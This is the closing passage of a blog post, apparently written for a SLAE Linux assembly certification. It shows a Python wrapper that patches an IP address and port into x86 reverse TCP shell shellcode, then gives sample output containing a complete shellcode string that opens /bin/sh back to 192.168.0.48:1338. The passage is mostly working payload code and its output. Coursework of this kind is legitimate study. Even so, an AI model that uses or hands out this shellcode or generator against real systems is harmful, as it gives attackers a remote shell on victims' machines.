</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>    hex_port = <span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\\</span><span style=color:#0086d2>x</span><span style=color:#0086d2>{}</span><span style=color:#0086d2>\\</span><span style=color:#0086d2>x</span><span style=color:#0086d2>{}</span><span style=color:#0086d2>&#34;</span>.format(str_port[:<span style=color:#0086f7;font-weight:700>2</span>], str_port[<span style=color:#0086f7;font-weight:700>2</span>:])
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>    <span style=color:#fb660a;font-weight:700>if</span> <span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\\</span><span style=color:#0086d2>x00&#34;</span> in hex_port:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>        print(<span style=color:#0086d2>&#34;[-] Sorry, null byte found in that port, chose another port.&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>        print(<span style=color:#0086d2>&#34;[-] Ports between 1-256 will always contain a null byte.&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>        print(<span style=color:#0086d2>&#34;[-] Port: </span><span style=color:#0086d2>{}</span><span style=color:#0086d2>&#34;</span>.format(hex_port))
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>        sys.exit(<span style=color:#0086f7;font-weight:700>1</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>    <span style=color:#fb660a;font-weight:700>if</span> <span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\\</span><span style=color:#0086d2>x00&#34;</span> in hex_ip or <span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\\</span><span style=color:#0086d2>x0&#34;</span> in hex_ip:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>        print(<span style=color:#0086d2>&#34;[-] Sorry, a null byte was found in the XORed value, this is the end for you...&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>        print(<span style=color:#0086d2>&#34;[-] Value: </span><span style=color:#0086d2>{}</span><span style=color:#0086d2>&#34;</span>.format(hex_ip))
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>        sys.exit(<span style=color:#0086f7;font-weight:700>1</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>    shellcode = shellcode.replace(<span style=color:#0086d2>&#34;</span><span style=color:#0086d2>{port}</span><span style=color:#0086d2>&#34;</span>, hex_port)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>    shellcode = shellcode.replace(<span style=color:#0086d2>&#34;</span><span style=color:#0086d2>{ip}</span><span style=color:#0086d2>&#34;</span>, hex_ip)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>    print(<span style=color:#0086d2>&#34;[+] Reverse TCP shell connecting to </span><span style=color:#0086d2>{ip}</span><span style=color:#0086d2>:</span><span style=color:#0086d2>{port}</span><span style=color:#0086d2>&#34;</span>.format(ip=ip, port=port))
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>    print(<span style=color:#0086d2>&#34;[+] Your Shellcode:&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>    print(shellcode)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span><span style=color:#fb660a;font-weight:700>if</span> __name__ == <span style=color:#0086d2>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span>    <span style=color:#fb660a;font-weight:700>if</span> len(sys.argv) &lt; <span style=color:#0086f7;font-weight:700>3</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>        print(<span style=color:#0086d2>&#34;Usage: python3 wrapper.py &lt;ip&gt; &lt;port&gt;&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span>        sys.exit(<span style=color:#0086f7;font-weight:700>0</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span>    <span style=color:#fb660a;font-weight:700>if</span> int(sys.argv[<span style=color:#0086f7;font-weight:700>2</span>]) &lt; <span style=color:#0086f7;font-weight:700>1024</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span>        print(<span style=color:#0086d2>&#34;[!] Warning: Ports &lt; 1024 must be run as a root&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span>    <span style=color:#fb660a;font-weight:700>if</span> len(sys.argv) == <span style=color:#0086f7;font-weight:700>3</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span>        <span style=color:#fb660a;font-weight:700>if</span> (int(sys.argv[<span style=color:#0086f7;font-weight:700>2</span>]) &gt; <span style=color:#0086f7;font-weight:700>65535</span>):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span>            print(<span style=color:#0086d2>&#34;[-] Port too large&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span><span>            sys.exit(<span style=color:#0086f7;font-weight:700>1</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span><span>        main(sys.argv[<span style=color:#0086f7;font-weight:700>1</span>], int(sys.argv[<span style=color:#0086f7;font-weight:700>2</span>]))
</span></span></code></pre></div><p>Running the script yields:</p><pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_2$ python wrapper.py 192.168.0.48 1338
[+] Reverse TCP shell connecting to 192.168.0.48:1338
[+] Your Shellcode:
\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\xb3\x03\x68\x3f\x57\xff\xcf\x83\x34\x24\xff\x66\x68\x05\x3a\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x3f\x89\xfb\x89\xd1\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xc0\xb0\x0b\xcd\x80
</code></pre><p>Screenshot showing the TCP reverse shell in action!</p><p><img src=demo.png alt="TCP Reverse shell"></p><hr><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p><p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p><p>Student ID: SLAE-1490</p></div></div></div></article></div></div><footer></footer></div><script src=/js/particles.min.js defer></script><script src=/js/particles.conf.js defer></script><script src=/js/baffle.min.js async></script><script src=/js/main.js defer async></script></body></html>